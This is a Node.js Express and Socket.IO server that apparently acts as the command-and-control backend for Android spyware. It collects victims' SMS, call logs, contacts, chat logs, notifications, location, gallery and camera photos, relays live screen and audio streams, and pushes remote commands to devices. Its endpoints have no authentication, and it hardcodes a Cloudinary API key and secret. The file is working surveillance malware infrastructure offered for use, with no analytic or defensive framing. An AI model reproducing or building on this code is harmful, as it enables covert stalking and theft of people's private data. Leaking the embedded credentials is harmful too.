const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io");
const compression = require('compression'); 

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// ✅ SOCKET.IO SETUP
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8, 
    pingTimeout: 60000,     
    pingInterval: 25000,    
    transports: ['websocket', 'polling']
});

// --- CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- SETUP ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(compression()); 
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status
let devicesStatus = {}; 

// ==================================================
//  🔥 SOCKET LOGIC
// ==================================================
io.on('connection', (socket) => {
    socket.on('join', (roomID) => {
        socket.join(roomID);
        console.log(`🔌 Device Joined: ${roomID}`);
    });

    socket.on('screen-data', (data) => {
        socket.volatile.to(data.room).emit('screen-data', data.image);
    });

    socket.on('control-event', (data) => {
        socket.to(data.room).emit('control-event', data);
    });

    socket.on('send-command', (data) => {
        if (data.targetId && data.command) {
            console.log(`🚀 Sending Command: ${data.command}`);
            io.to(data.targetId).emit('command', data.command);
        }
    });

    socket.on('audio-stream', (blob) => {
        const rooms = socket.rooms;
        for (const room of rooms) {
            if (room !== socket.id) socket.to(room).emit('audio-stream', blob);
        }
    });

    socket.on('disconnect', () => { });
});

app.get('/', (req, res) => {
    res.send('✅ Server Running: Gallery Limit 1500 (Camera Unlimited)');
});

// ==================================================
//  🔥 UPLOAD SYSTEM (FIXED LOGIC)
// ==================================================
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data, type } = req.body; 
    
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    // Folder Path logic
    let folderPath = id;
    // Agar type 'gallery' hai toh folder id/gallery hoga, nahi toh id/camera etc.
    if (type && type !== "null" && type !== "") folderPath = `${id}/${type}`; 

    // --- UPLOAD FUNCTION ---
    const performUpload = () => {
        let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;

        cloudinary.uploader.upload(base64Image, 
            { folder: folderPath, public_id: Date.now().toString(), resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" }, 
            (error, result) => {
                if (error) return res.status(500).json({ error: "Upload Failed" });
                
                // Frontend ko batao nayi file aayi hai
                io.emit('new-file', { device_id: id, url: result.secure_url, type: type || 'gallery' });
                res.json({ status: "success", url: result.secure_url });
            }
        );
    };

    // --- 🔥 MAIN LOGIC FOR LIMIT ---
    
    // Sirf agar "Gallery" hai, tabhi limit check karo
    if (type === 'gallery') {
        cloudinary.search
            .expression(`folder:${folderPath}`) // Check gallery folder count
            .max_results(1)
            .execute()
            .then(result => {
                if (result.total_count >= 1500) {
                    console.log(`⛔ GALLERY LIMIT REACHED for ${id}: ${result.total_count} photos.`);
                    // Upload Mat Karo, bas success bhej do taaki app crash na ho
                    return res.json({ status: "limit_reached", message: "Gallery Full (1500)" });
                }
                // Limit nahi hui, Upload karo
                performUpload();
            })
            .catch(err => {
                console.log("Cloudinary Search Error:", err.message);
                performUpload(); // Error aaye to bhi upload kardo
            });
    } else {
        // Agar Camera, Screenshot, ya Live hai -> DIRECT UPLOAD (No Limit)
        // Kyunki ye 'gallery' nahi hai
        console.log(`📸 Uploading Live Capture (Type: ${type}) - No Limit Applied`);
        performUpload();
    }
});

// ==================================================
//  OTHER APIS (Gallery List, Status, Data)
// ==================================================

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const limit = req.query.limit ? parseInt(req.query.limit) : 20;
    const next_cursor = req.query.next_cursor || null;

    cloudinary.api.resources({ 
        type: 'upload', prefix: id + "/", max_results: limit, next_cursor: next_cursor, direction: 'desc', context: true 
    }, 
    (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
});

app.get('/api/admin/all-devices', (req, res) => { res.json(devicesStatus); });

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    res.json({ ...device, isOnline: (Date.now() - device.lastSeen) < 60000 });
});

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        let pendingCommand = "none";
        
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none"; 
        }

        devicesStatus[id] = {
            ...devicesStatus[id], id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            accuracy: accuracy || (devicesStatus[id]?.accuracy || 0),
            speed: speed || (devicesStatus[id]?.speed || 0),
            lastSeen: Date.now(),
            command: devicesStatus[id]?.command || "none" 
        };
        res.json({ status: "success", command: pendingCommand });
    } catch (e) { res.status(500).json({ error: "Server Error" }); }
});

app.post('/api/upload_data', async (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
                devicesStatus[id].accuracy = locObj.accuracy || locObj.acc || 0;
                devicesStatus[id].speed = locObj.speed || 0;
            }
        }
        let finalData = parsedData;
        if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            try { existingData = JSON.parse(await fs.promises.readFile(filePath, 'utf8')); } catch (e) { }
            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            if (type === 'chat_logs') {
                newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
                finalData = [...existingData, ...newDataArray]; 
                if (finalData.length > 5000) finalData = finalData.slice(finalData.length - 5000);
            } else {
                finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            }
        }
        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });
    } catch (error) { res.status(500).json({ status: "error" }); }
});

app.get('/api/get-data/:device_id/:type', async (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    try {
        if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(res);
        else res.json([]);
    } catch (e) { res.json([]); }
});

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    io.to(device_id.toUpperCase().trim()).emit('command', command);
    res.json({ status: "success", command: command });
});

server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
